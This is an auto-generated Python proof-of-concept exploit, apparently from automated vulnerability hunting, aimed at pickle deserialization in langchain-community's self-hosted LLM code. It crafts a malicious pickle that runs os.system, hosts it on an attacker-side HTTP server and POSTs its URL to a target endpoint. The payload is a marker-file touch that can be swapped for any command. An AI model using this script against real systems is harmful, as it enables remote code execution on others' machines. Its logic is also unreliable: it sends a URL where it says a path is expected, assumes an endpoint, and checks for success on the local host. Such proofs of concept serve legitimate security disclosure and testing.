#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-020
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_who_control_pipeline__send_pipeline_to_device_4.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only.

Vulnerability: The function _send_pipeline_to_device in
langchain_community/llms/self_hosted.py uses pickle.load on a file path
supplied by the user without any validation. An attacker can provide a path
to a malicious pickle file, leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
   (touch /tmp/poc_success.txt)
2. Hosting it on a local HTTP server
3. Sending a request to the vulnerable endpoint with the path to the
   malicious pickle file

Usage:
    python poc.py [--target TARGET_URL] [--listen-port PORT]

    Default target: http://localhost:8000/api/v1/trigger
    Default listen port: 9999
"""

import argparse
import base64
import http.server
import json
import os
import pickle
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEFAULT_TARGET = "http://localhost:8000/api/v1/trigger"
DEFAULT_LISTEN_PORT = 9999
POC_MARKER = "/tmp/poc_success.txt"

# ---------------------------------------------------------------------------
# Malicious pickle payload
# ---------------------------------------------------------------------------
class RCE:
    """Class whose __reduce__ method executes a command during unpickling."""
    def __reduce__(self):
        # Benign command: create a marker file to prove code execution
        cmd = f"touch {POC_MARKER}"
        return (os.system, (cmd,))

def create_malicious_pickle(path: str) -> None:
    """Create a malicious pickle file at the given path."""
    payload = RCE()
    with open(path, "wb") as f:
        pickle.dump(payload, f)
    print(f"[+] Created malicious pickle file: {path}")

# ---------------------------------------------------------------------------
# Simple HTTP server to serve the malicious pickle file
# ---------------------------------------------------------------------------
class PickleHandler(http.server.SimpleHTTPRequestHandler):
    """Custom handler that serves the pickle file with proper headers."""
    def do_GET(self):
        # Only serve the pickle file
        if self.path == "/malicious.pkl":
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.end_headers()
            with open("malicious.pkl", "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        # Suppress default logging for cleaner output
        pass

def start_http_server(port: int) -> threading.Thread:
    """Start a simple HTTP server on the given port in a background thread."""
    server = http.server.HTTPServer(("0.0.0.0", port), PickleHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] HTTP server started on port {port}")
    return server

# ---------------------------------------------------------------------------
# Exploit execution
# ---------------------------------------------------------------------------
def send_exploit(target_url: str, pickle_url: str) -> None:
    """
    Send a POST request to the vulnerable endpoint with the path to the
    malicious pickle file.
    """
    # The vulnerable function expects a string path to a pickle file.
    # We send the URL of our hosted pickle file as the 'pipeline' parameter.
    data = json.dumps({"pipeline": pickle_url})
    headers = {"Content-Type": "application/json"}

    try:
        req = urllib.request.Request(
            target_url,
            data=data.encode("utf-8"),
            headers=headers,
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            print(f"[+] Request sent. Response status: {response.status}")
            print(f"[+] Response body: {response.read().decode('utf-8')}")
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        print(f"[!] Response: {e.read().decode('utf-8')}")
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)

def verify_exploit() -> bool:
    """Check if the marker file was created, indicating successful RCE."""
    time.sleep(1)  # Give the command time to execute
    if os.path.exists(POC_MARKER):
        print(f"[+] SUCCESS! Marker file created: {POC_MARKER}")
        print("[+] Arbitrary code execution confirmed!")
        return True
    else:
        print(f"[-] Marker file not found: {POC_MARKER}")
        print("[-] Exploit may have failed or the command was not executed.")
        return False

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community-only"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=DEFAULT_LISTEN_PORT,
        help=f"Port for local HTTP server (default: {DEFAULT_LISTEN_PORT})"
    )
    args = parser.parse_args()

    # Get our local IP address for the pickle URL
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    pickle_url = f"http://{local_ip}:{args.listen_port}/malicious.pkl"

    print("[*] Starting langchain-community-only RCE PoC")
    print(f"[*] Target: {args.target}")
    print(f"[*] Pickle URL: {pickle_url}")

    # Step 1: Create malicious pickle file
    create_malicious_pickle("malicious.pkl")

    # Step 2: Start HTTP server to serve the pickle file
    server = start_http_server(args.listen_port)

    # Step 3: Send exploit request
    print("[*] Sending exploit request...")
    send_exploit(args.target, pickle_url)

    # Step 4: Verify exploit success
    success = verify_exploit()

    # Cleanup
    server.shutdown()
    if os.path.exists("malicious.pkl"):
        os.remove("malicious.pkl")
    if success and os.path.exists(POC_MARKER):
        # Remove marker file for cleanliness
        os.remove(POC_MARKER)

    if not success:
        sys.exit(1)

if __name__ == "__main__":
    main()
